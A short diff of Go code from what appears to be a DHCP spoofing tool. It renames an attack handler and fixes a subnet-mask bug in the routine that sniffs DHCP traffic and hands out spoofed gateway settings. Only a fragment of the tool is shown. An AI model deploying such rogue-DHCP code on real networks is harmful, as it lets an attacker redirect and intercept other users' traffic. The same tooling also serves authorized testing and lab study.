@@ -15,7 +15,7 @@ var availableIP []net.IP
 var serverIP net.IP
 var iface, gateway, mask string
 
-func DNSAttack(packet gopacket.Packet) {
+func DHCPAttack(packet gopacket.Packet) {
 	dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
 	if dhcpLayer != nil {
 		dhcp, _ := dhcpLayer.(*layers.DHCPv4)
@@ -82,8 +82,8 @@ func DHCPOfferAck(dhcp *layers.DHCPv4, iface string, availableIP, sourceIp, gate
 }
 
 func DHCPSpoofing(pool, maskGiven, gatewayGiven, ifaceGiven string) {
-	availableIP, _ = utils.GeneratePool(pool, mask)
-	sniffer.NewSniffer(iface, "udp and (port 67 or 68)", DNSAttack)
+	availableIP, _ = utils.GeneratePool(pool, maskGiven)
+	sniffer.NewSniffer(iface, "udp and (port 67 or 68)", DHCPAttack)
 	serverIP = availableIP[len(availableIP)-1]
 	iface = ifaceGiven
 	gateway = gatewayGiven
